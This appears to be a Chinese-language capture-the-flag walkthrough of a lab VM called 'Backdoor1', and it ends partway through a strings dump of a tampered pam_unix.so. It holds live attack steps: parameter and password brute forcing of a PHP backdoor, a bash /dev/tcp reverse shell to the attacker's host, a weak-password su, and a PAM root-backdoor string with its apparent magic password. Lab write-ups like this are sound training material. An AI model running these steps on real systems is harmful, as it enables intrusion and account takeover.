┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l           
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.172 08:00:27:56:2e:31       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.947 seconds (131.48 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.172     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 09:57 EDT
Nmap scan report for 192.168.205.172
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:56:2E:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
                                                          
```

那直接看web

![image-20250709215805803](https://7r1umphk.github.io/image/20250709215806158.webp)

疯狂暗示后门，哈哈哈

扫一下目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.172 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.172
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 12033]
/backdoor.php         (Status: 200) [Size: 0]
Progress: 49295 / 1102800 (4.47%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 50573 / 1102800 (4.59%)
===============================================================
Finished
===============================================================
                       
```

/backdoor.php啊这......

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.172/backdoor.php' -v
*   Trying 192.168.205.172:80...
* Connected to 192.168.205.172 (192.168.205.172) port 80
* using HTTP/1.x
&gt; GET /backdoor.php HTTP/1.1
&gt; Host: 192.168.205.172
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Wed, 09 Jul 2025 13:59:12 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Content-Length: 0
&lt; Content-Type: text/html; charset=UTF-8
&lt; 
* Connection #0 to host 192.168.205.172 left intact
                                            
```

没东西，应该是需要点参数，爆破一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -u 'http://192.168.205.172/backdoor.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.172/backdoor.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

password                [Status: 200, Size: 10, Words: 3, Lines: 1, Duration: 3ms]
cmd                     [Status: 200, Size: 15, Words: 3, Lines: 1, Duration: 0ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

两个参数，password，我们也不知道，直接爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -u 'http://192.168.205.172/backdoor.php?cmd=id&amp;password=FUZZ' -w /usr/share/wordlists/rockyou.txt   --fw 2                 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.172/backdoor.php?cmd=id&amp;password=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 2
________________________________________________

iloveyou                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 45ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

`Gmeek-html&lt;iframe src='//player.bilibili.com/player.html?isOutside=true&amp;aid=113575678971704&amp;bvid=BV19Bz4YuEi2&amp;cid=27120961338&amp;p=1&amp;autoplay=0' scrolling='no' border='0' frameborder='no' framespacing='0' allowfullscreen='true' width='100%' height='460px'&gt;&lt;/iframe&gt;`

贫一下，哈哈哈

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.172/backdoor.php?cmd=id&amp;password=iloveyou' -v
*   Trying 192.168.205.172:80...
* Connected to 192.168.205.172 (192.168.205.172) port 80
* using HTTP/1.x
&gt; GET /backdoor.php?cmd=id&amp;password=iloveyou HTTP/1.1
&gt; Host: 192.168.205.172
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Wed, 09 Jul 2025 14:03:13 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Content-Length: 0
&lt; Content-Type: text/html; charset=UTF-8
&lt; 
* Connection #0 to host 192.168.205.172 left intact
                    
```

没显示，tcpdump看看，建议直接在浏览器访问

kali监听

```
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -A -n icmp
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

![image-20250709220501352](https://7r1umphk.github.io/image/20250709220501561.webp)

发包卡了一会，看一下监听

```
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -A -n icmp
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10:04:53.658512 IP 192.168.205.172 &gt; 192.168.205.128: ICMP echo request, id 620, seq 1, length 64
E..TaQ@.@.............e..l...wnh....SR
..................... !'#$%&amp;'()*+,-./01234567
10:04:53.658530 IP 192.168.205.128 &gt; 192.168.205.172: ICMP echo reply, id 620, seq 1, length 64
E..T.j..@./...........m..l...wnh....SR
..................... !'#$%&amp;'()*+,-./01234567
10:04:54.688807 IP 192.168.205.172 &gt; 192.168.205.128: ICMP echo request, id 620, seq 2, length 64
E..TbL@.@................l...wnh......
..................... !'#$%&amp;'()*+,-./01234567
10:04:54.688827 IP 192.168.205.128 &gt; 192.168.205.172: ICMP echo reply, id 620, seq 2, length 64
E..T....@./y.............l...wnh......
..................... !'#$%&amp;'()*+,-./01234567
```

ok，没有问题，这边我弹shell直接访问reverce.sh了，因为这个靶机的模板默认就只要busybox，我懒的稳固

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat reverse.sh                                                                             
bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'
              
```

然后开个web服务就好了

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888           
listening on [any] 8888 ...

```

web访问

![image-20250709220710494](https://7r1umphk.github.io/image/20250709220710601.webp)

一直在转圈圈就对了

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.172] 53922
bash: cannot set terminal process group (420): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Backdoor1:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Backdoor1:/var/www/html$ ls -al
ls -al
total 24
drwxr-xr-x 2 root root  4096 Jul  8 09:26 .
drwxr-xr-x 3 root root  4096 Apr  4 23:20 ..
-rw-r--r-- 1 root root   310 Jul  8 09:25 backdoor.php
-rw-r--r-- 1 root root 12033 Jul  8 09:26 index.html
www-data@Backdoor1:/var/www/html$ cd /home
cd /home
www-data@Backdoor1:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jul  8 09:12 .
drwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..
drwx------  2 morri morri 4096 Jul  8 09:13 morri
```

不给访问，那就试试弱密码吧，最近很喜欢出弱密码

```
www-data@Backdoor1:/home$ su morri
su morri
Password: morri
id
uid=1000(morri) gid=1000(morri) groups=1000(morri)
```

一发入魂

稳固

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

扒拉

```
morri@Backdoor1:/home$ cd morri/
morri@Backdoor1:~$ ls -al
total 24
drwx------ 2 morri morri 4096 Jul  8 09:13 .
drwxr-xr-x 3 root  root  4096 Jul  8 09:12 ..
-rw-r--r-- 1 morri morri  220 Jul  8 09:12 .bash_logout
-rw-r--r-- 1 morri morri 3526 Jul  8 09:12 .bashrc
-rw-r--r-- 1 morri morri  807 Jul  8 09:12 .profile
-rw-r--r-- 1 root  root    44 Jul  8 09:13 user.txt
morri@Backdoor1:~$ cat user.txt 
flag{user-4645258dd0f71f7f430bb4f3c37748e6}
morri@Backdoor1:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for morri: 
Sorry, user morri may not run sudo on Backdoor1.
morri@Backdoor1:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
morri@Backdoor1:~$ ss -tulnp
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128                 [::]:22               [::]:*      
tcp     LISTEN   0        128                    *:80                  *:*      
morri@Backdoor1:~$ cd /opt/
morri@Backdoor1:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Apr  1 08:59 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
morri@Backdoor1:/opt$ ls /mnt/
morri@Backdoor1:/opt$ ls -la /mnt/
total 8
drwxr-xr-x  2 root root 4096 Mar 18 20:26 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
morri@Backdoor1:/opt$ ls -la /tmp/
total 8
```

什么都没有，按时间扒拉一下文件

```
morri@Backdoor1:/opt$ find / -type f -newermt '2025-07-05' ! -newermt '2025-07-10' ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2&gt;/dev/null
/usr/lib/x86_64-linux-gnu/security/pam_unix.so
/home/morri/.bash_logout
/home/morri/.bashrc
/home/morri/user.txt
/home/morri/.profile
/etc/gshadow-
/etc/sudoers
/etc/subgid-
/etc/apt/sources.list
/etc/hosts
/etc/ld.so.cache
/etc/shadow-
/etc/subgid
/etc/passwd-
/etc/gshadow
/etc/group-
/etc/shadow
/etc/subuid-
/etc/php/8.3/apache2/php.ini
/etc/subuid
/etc/group
/etc/hostname
/etc/resolv.conf
/etc/passwd
/var/www/html/index.html
/var/www/html/backdoor.php
/var/log/debug
/var/log/daemon.log.1
/var/log/apt/eipp.log.xz
/var/log/apt/term.log
/var/log/apt/history.log
/var/log/kern.log
/var/log/syslog
/var/log/btmp
/var/log/auth.log.1
/var/log/auth.log
/var/log/dpkg.log
/var/log/alternatives.log
/var/log/lastlog
/var/log/wtmp
/var/log/syslog.1
/var/log/faillog
/var/log/debug.1
/var/log/syslog.2.gz
/var/log/daemon.log
/var/log/user.log
/var/log/messages
/var/log/messages.1
/var/log/kern.log.1
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006397f6f5f0cb6-e7cfe6374e33fdfc.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system.journal
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006396a764f42ae-bf156f4b6c4eb513.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000@0006396aa29dceaf-fdca4d5bafaa45b8.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000.journal
/var/lib/dhcp/dhclient.enp0s3.leases
/var/lib/dpkg/lock
/var/lib/dpkg/info/libfl2:amd64.list
/var/lib/dpkg/info/curl.list
/var/lib/dpkg/info/m4.list
/var/lib/dpkg/info/flex.list
/var/lib/dpkg/info/libpam0g-dev:amd64.list
/var/lib/dpkg/info/libsigsegv2:amd64.list
/var/lib/dpkg/info/wget.list
/var/lib/dpkg/info/libfl-dev:amd64.list
/var/lib/dpkg/info/netcat-openbsd.list
/var/lib/dpkg/info/bison.list
/var/lib/dpkg/info/netcat.list
/var/lib/dpkg/info/libpam0g:amd64.list
/var/lib/dpkg/alternatives/yacc
/var/lib/dpkg/alternatives/nc
/var/lib/dpkg/triggers/Lock
/var/lib/dpkg/status
/var/lib/dpkg/status-old
/var/lib/apt/lists/mirrors.aliyun.com_debian_dists_bullseye-backports_InRelease
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_binary-amd64_Packages
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_InRelease
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_source_Sources
/var/lib/apt/extended_states
/var/lib/systemd/random-seed
/var/lib/systemd/timesync/clock
/var/lib/systemd/timers/stamp-logrotate.timer
/var/lib/systemd/timers/stamp-phpsessionclean.timer
/var/lib/sudo/lectured/morri
/var/lib/logrotate/status
/var/cache/apt/pkgcache.bin
/var/cache/apt/srcpkgcache.bin
/var/cache/debconf/templates.dat
/var/cache/debconf/config.dat-old
/var/cache/debconf/config.dat
/var/cache/debconf/templates.dat-old
```

他改了/usr/lib/x86_64-linux-gnu/security/pam_unix.so，这是PAM框架的一部分,通俗易懂一点就是密码验证

string瞄眼

````
morri@Backdoor1:/opt$ strings /usr/lib/x86_64-linux-gnu/security/pam_unix.so
P`^B
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
calloc
malloc
strncpy
strlen
crypt_r
free
pipe
fork
dup2
pam_modutil_sanitize_helper_fds
geteuid
setuid
execve
pam_syslog
stdout
fflush
_exit
__errno_location
waitpid
sigaction
pam_modutil_read
__isoc99_sscanf
pam_sm_acct_mgmt
pam_get_item
getuid
pam_get_data
dcngettext
snprintf
dcgettext
pam_sm_authenticate
pam_get_user
pam_get_authtok
pam_set_data
pam_sm_setcred
strcmp
fopen
fgets
strncmp
strtok_r
fclose
pam_sm_chauthtok
pam_prompt
pam_set_item
yp_get_default_domain
yp_master
getrpcport
strdup
clnt_create
authunix_create_default
xdr_int
clnt_sperrno
yperr_string
pam_sm_open_session
pam_modutil_getlogin
pam_sm_close_session
write
feof
__getdelim
strchr
__ctype_b_loc
strsep
strcasecmp
strncasecmp
strtol
memset
yp_bind
yp_match
yp_unbind
strcpy
memcpy
pam_fail_delay
gettimeofday
getpid
clock
pam_modutil_getpwnam
pam_modutil_getspnam
time
stpcpy
usleep
ulckpwdf
umask
fileno
__fxstat
fchown
fchmod
fputs
fsync
rename
unlink
fgetpwent
putpwent
fgetspent
putspent
xdr_string
strncat
libpam.so.0
libcrypt.so.1
libnsl.so.2
libc.so.6
pam_unix.so
XCRYPT_2.0
LIBNSL_1.0
GLIBC_2.3
GLIBC_2.7
GLIBC_2.14
GLIBC_2.2.5
LIBPAM_EXTENSION_1.1
LIBPAM_EXTENSION_1.0
LIBPAM_1.0
LIBPAM_MODUTIL_1.0
LIBPAM_MODUTIL_1.1.9
/root/Linux-PAM-1.3.1/libpam/.libs
u/UH
AWAVI
AUATUH
[]A\A]A^A_
AVAUI
[]A\A]A^A_
t$01
AUATUH
]A\A]A^
T$ H
HcL$
T$ H
D$ H
D$ H
AUATUH
]A\A]A^
]A\A]A^
 []A\
[]A\
AWAVAUATI
[]A\A]A^A_
AVAUATUSH
L$@H
T$&lt;H
t$X1
t$HH
t$HL
D$PH
l$`H
D$XD
D$DH
T$XD
T$XH
t$HH
t$HD
D$DH
L$`D
L$@H
t$`D
D$&lt;H
D$XH
[]A\A]A^A_
T$HD
T$X1
T$XH
t$HD
t$HD
t$HA
D$hH
|$pH
D$hH
D$ H
D$pH
L$ H
t$hE
L$ H
ATUH
[]A\A]
[]A\A]
uWE1
[]A\
[]A\
AVAUI
t$01
[]A\A]A^A_
ATUSH
[]A\
 []A\
ASARL
ATUSH
[]A\A]A^
AVAUATA
|$ H
t$,H
L$,D
@D#d
8[]D
A\A]A^A_
|$ H
|$ H
|$ H
|$ H
|$ 1
AVAUA
u&amp;E1
[]A\A]A^A_
|$xL
L$lL
D$pH
|$xA
D$xA
l$xI
D$\H
|$ H
|$0H
T$HH
D$@B
D$\H
D$xH
l$xL
l$xL
t$ I
l$xL
t$0I
AUATUH
 ]A\A]
 ]A\A]
AUATI
L$ H
-UN*X-FAH
|$ H
|$ H
[]A\A]A^A_
T$(H
D$(H
t$ H
L$@H
T$8H
D$HM
ATUIc
[]A\A]A^
t$0L
AWAVAUA
u#E1
[]A\A]A^A_
[]A\A]
[]A\A]
[]A\A]
ATUH
[]A\
[]A\
K H)
{0H9
$$1$
AWAVAUATI
|$ L
h[]A\A]A^A_
h[]A\A]A^A_
[]A\A]A^A_
AWAVAUATUSH
t$\D
|$`L
|$XL
T$8H
D$ H
D$(H
[]A\A]A^A_
tmE9
D$8H
L$0L
D$8H
AWAVAUI
ATUSH
t$0D
|$,H
|$(H
[]A\A]A^A_
AWAVI
ATUSH
|$|H
|$xH
[]A\A]A^A_
AVAUATUSD
p $E
QZ^&amp;
A]A^
AWAVI
[]A\A]A^A_
[]A\
AVAUATI
t$0H
=UUUUwni
$w}E
=UUUUv
|$ H
D$,
|$'L
|$-
|$(L
|$.
|$)L
|$/
|$*L
|$%
[]A\A]A^A_
AVAUATUSD
p $E
QZ^&amp;
A]A^
AWAVI
[]A\A]A^A_
[]A\
AVAUATI
t$0H
=UUUUwni
$w}E
=UUUUv
|$ H
D$,
|$'L
|$-
|$(L
|$.
|$)L
|$/
|$*L
|$%
[]A\A]A^A_
Could not make pipe: %m
stdout
dup2 of %s failed: %m
setuid failed: %m
/sbin/unix_chkpwd
chkexpiry
unix_chkpwd abnormal exit: %d
Fork failed: %m
unix_setcred_return
Linux-PAM
helper binary execve failed: %m
read unix_chkpwd output error %d: %m
unix_chkpwd waitpid returned %d: %m
could not identify user (from uid=%lu)
could not identify user (from getpwnam(%s))
account %s has expired (account expired)
Your account has expired; please contact your system administrator
expired password for user %s (root enforced)
You are required to change your password immediately (administrator enforced)
expired password for user %s (password aged)
You are required to change your password immediately (password expired)
account %s has expired (failed to change password)
password for user %s will expire in %d days
Warning: your password will expire in %d days
Warning: your password will expire in %d day
pam_unix_auth: cannot allocate ret_data
auth could not identify password for [%s]
PAM: Root access granted via backdoor
bad username [%s]
660930334
No password supplied
Password unchanged
Can not get username
/etc/security/opasswd
bad authentication token
 or NIS
 not
username [%s] obtained
Changing password for %s.
user not authenticated
user shadow entry expired
new password not acceptable 2
can't get local yp domain: %s
passwd.byname
new password not acceptable
You must choose a longer password
can't open %s file to check old passwords
Password has been already used. Choose another.
password - could not identify user
user '%s' does not exist in /etc/passwd%s
user '%s' has corrupted passwd entry
password - (old) token not obtained
You must wait longer to change your password
password - new password not obtained
user password changed by another process
crypt() failure or out of memory for password
can't find the master ypserver: %s
yppasswdd not running on NIS master host
yppasswd daemon running on illegal port
Use NIS server on %s with port %d
password%s changed for %s on %s
NIS password could not be changed.
password received unknown request
session closed for user %s
open_session - error recovering username
open_session - error recovering service
session opened for user %s by %s(uid=%lu)
close_session - error recovering username
close_session - error recovering service
nullok
nonull
stdin
 user=
**unknown**
/etc/login.defs
ENCRYPT_METHOD
SHA_CRYPT_MAX_ROUNDS
unrecognized option [%s]
/etc/passwd
_pam_unix_getpwnam_%s
no memory for data-name
check pass; user (%s) unknown
check pass; user unknown
audit
use_first_pass
try_first_pass
authtok_type=
use_authtok
debug
nodelay
bigcrypt
likeauth
remember=
noreap
broken_shadow
sha256
sha512
rounds=
blowfish
minlen=
quiet
no_pass_expiry
Cannot send password to helper: %m
%d more authentication failure%s; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s
service(%s) ignoring max retries; %d &gt; %d
option remember not allowed for this module type
option minlen not allowed for this module type
option rounds not allowed for this module type
Password minlen reset to 8 characters
unrecognized ENCRYPT_METHOD value [%s]
authentication failure; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s
no memory for failure recorder
/dev/urandom
*NP*
$2a$
rounds=%u$
/etc/security/nopasswd
%s:%s:%d:%s
%s:%s:%d:%s,%s
%s:%lu:1:%s
/etc/npasswd
password changed for %s
/etc/nshadow
/etc/shadow
account %s has password changed in future
Algo %s not supported by the crypto backend, falling back to MD5
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./
./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
;*3$'
GCC: (Debian 10.2.1-6) 10.2.1 20210110
|!3)
|%rc
        3       -
        4       -
        8       -
        9       -
        :       -
 low
'key
 low
(pwd
~20'
 $0.(
;pwd
;err
(buf
;len
&gt;&lt;D
Cerr
'pwd
'new
'old
'tty
9% 1
'pwd
'fds
'len
!nis
!nis
!ret
'buf
~'len
!err
P'tty
5val
;key
=buf
?=tmp
;__n
~$len
0pwd
0pwd
0pwd
 $,(
 $,(
/usr/include
bigcrypt.c
crypt.h
stdlib.h
string.h
&lt;built-in&gt;
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include
../../libpam/include/security
/usr/include/x86_64-linux-gnu/sys
pam_unix_acct.c
stddef.h
types.h
__sigset_t.h
struct_FILE.h
FILE.h
pwd.h
shadow.h
__sigval_t.h
siginfo_t.h
signal.h
sigaction.h
_pam_types.h
support.h
stdio.h
pam_modules.h
passverify.h
unistd.h
pam_ext.h
libintl.h
pam_modutil.h
errno.h
wait.h
&lt;built-in&gt;
../../libpam/include/security
/usr/include
/usr/include/x86_64-linux-gnu/sys
pam_unix_auth.c
support.h
_pam_types.h
pam_modules.h
stdlib.h
pam_ext.h
syslog.h
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include/x86_64-linux-gnu/sys
/usr/include
../../libpam/include/security
/usr/include/rpc
/usr/include/netinet
/usr/include/rpcsvc
pam_unix_passwd.c
stddef.h
types.h
struct_FILE.h
FILE.h
types.h
stdint-intn.h
struct_timeval.h
pwd.h
shadow.h
_pam_types.h
support.h
types.h
stdint-uintn.h
sockaddr.h
socket.h
in.h
un.h
xdr.h
auth.h
clnt.h
yppasswd.h
pam_ext.h
ypclnt.h
passverify.h
string.h
malloc.h
libintl.h
pam_modules.h
md5.h
stdio.h
../../libpam/include/security
/usr/include
pam_unix_sess.c
support.h
_pam_types.h
pam_ext.h
pam_modutil.h
unistd.h
/usr/include/x86_64-linux-gnu/bits
/usr/include
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/sys
/usr/include/x86_64-linux-gnu/bits/types
../../libpam/include/security
/usr/include/rpcsvc
support.c
stdio.h
stdlib.h
stddef.h
types.h
types.h
__sigset_t.h
struct_FILE.h
FILE.h
pwd.h
__sigval_t.h
siginfo_t.h
signal.h
sigaction.h
_pam_types.h
support.h
pam_ext.h
pam_modutil.h
string.h
unistd.h
pam_modules.h
malloc.h
passverify.h
errno.h
wait.h
stdio.h
ctype.h
ypclnt.h
&lt;built-in&gt;
strings.h
[Y;YYWYYWYYWY
/usr/include/x86_64-linux-gnu/sys
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
../../libpam/include/security
/usr/include
passverify.c
stat.h
stddef.h
types.h
struct_timeval.h
struct_timespec.h
_pam_types.h
pwd.h
FILE.h
struct_FILE.h
support.h
shadow.h
time.h
stat.h
crypt.h
md5.h
stdio.h
unistd.h
string.h
time.h
pam_ext.h
stdlib.h
pam_modutil.h
bigcrypt.h
&lt;built-in&gt;
fcntl.h
errno.h
/X ..
X  ..
[  ..
= J.
&lt;  X
f...
/usr/include/rpc
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/sys
/usr/include/netinet
yppasswd_xdr.c
types.h
types.h
types.h
stdint-intn.h
stdint-uintn.h
sockaddr.h
socket.h
in.h
un.h
xdr.h
yppasswd.h
/usr/include
md5.c
md5_crypt.c
md5.h
stdlib.h
string.h
&lt;built-in&gt;
r/;&lt;
u;=I
==H&lt;
0:/;=I&lt;
18=-
uI=;
ue=-
Jtu-
ftu-
K-=-
Jtu-
ftu-
K-=-
K-=-
Jtu-
ftu-
ftu-
Jtu-
.V&gt;,
.K-=-
fu-=-
/-/-Ju.I&lt;
.W=-
0,0,.
.W=-
.W=-
0:0:.
:/=:&lt;
yJ.K
        ?/KH
/usr/include
md5.c
md5_crypt.c
md5.h
stdlib.h
string.h
&lt;built-in&gt;
r/;&lt;
u;=I
==H&lt;
0:/;=I&lt;
18=-
uI=;
ue=-
Jtu-
ftu-
K-=-
Jtu-
ftu-
K-=-
K-=-
Jtu-
ftu-
ftu-
Jtu-
.V&gt;,
.K-=-
fu-=-
/-/-Ju.I&lt;
.W=-
0,0,.
.W=-
.W=-
0:0:.
:/=:&lt;
yJ.K
        ?/KH
internal
bigcrypt
crypt_data
short unsigned int
cipher_ptr
__xx__
tmp_ptr
unsigned char
input
initialized
bigcrypt.c
setting
strncpy
plaintext_ptr
crypt_r
GNU C17 10.2.1 20210110 -mtune=generic -march=x86-64 -g -O2 -fPIC -fasynchronous-unwind-tables
long long unsigned int
dec_c2_cryptbuf
__builtin_calloc
long long int
keybuf
/root/Linux-PAM-1.3.1/modules/pam_unix
short int
keylen
output
n_seg
cdata
salt_ptr
malloc
__off_t
__gid_t
_IO_read_ptr
_pkey
_chain
void_uname
__sigval_t
si_errno
_shortbuf
_make_remark
is_hash_algo
sa_flags
_IO_read_base
__sighandler_t
_lower
si_stime
pipe
_arch
pw_shell
_exit
dup2
pamh
_fileno
_IO_read_end
_sigchld
authrv
_IO_backup_base
__isoc99_sscanf
execve
envp
_cur_column
_upper
si_overrun
_IO_codecvt
sp_inact
_bounds
si_addr
sp_max
_old_offset
sp_min
si_addr_lsb
si_sigval
sp_flag
newsa
geteuid
__off64_t
pam_unix_acct.c
si_pid
pam_modutil_redirect_fd
_IO_marker
_freeres_buf
PAM_MODUTIL_IGNORE_FD
__val
si_utime
get_account_info
_IO_write_ptr
__sigset_t
waitpid
fork
si_uid
_pad
siginfo_t
_IO_save_base
sival_int
sp_expire
pam_modutil_sanitize_helper_fds
_lock
_sigsys
_flags2
__builtin_puts
stdout
pw_passwd
_syscall
pam_sm_acct_mgmt
unix_args
pw_gid
_sigpoll
_sifields
pam_get_data
_IO_write_end
PAM_MODUTIL_PIPE_FD
_IO_lock_t
_IO_FILE
setuid
oldsa
si_tid
__clock_t
UNIX_Ctrls
pam_get_item
dcngettext
sp_pwdp
PAM_MODUTIL_NULL_FD
token
fflush
_markers
pw_dir
_sigfault
sp_warn
pam_handle_t
_IO_buf_end
_addr_bnd
__pid_t
_call_addr
pw_gecos
_vtable_offset
pretval
dcgettext
spwd
si_status
argc
__errno_location
__uint32_t
check_shadow_expiry
__uid_t
__sigaction_handler
si_signo
_kill
_IO_save_end
sa_sigaction
sa_mask
daysleft
__pad0
__pad5
snprintf
sp_lstchg
_unused2
sa_restorer
pw_name
_unix_run_verify_binary
pam_handle
_set_ctrl
getuid
